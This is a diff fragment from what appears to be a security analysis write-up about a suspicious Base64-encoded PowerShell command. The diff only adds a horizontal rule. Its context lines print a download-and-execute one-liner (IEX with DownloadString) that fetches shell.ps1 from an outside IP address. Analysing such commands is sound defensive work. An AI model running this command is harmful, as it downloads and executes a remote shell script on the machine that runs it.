@@ -70,7 +70,7 @@ A suspicious PowerShell command was identified using Base64 encoding.
 ```powershell
 IEX (New-Object Net.WebClient).DownloadString('http://192.168.10.45/shell.ps1')
 
-
+---
 
 🔍 Payload Analysis
 
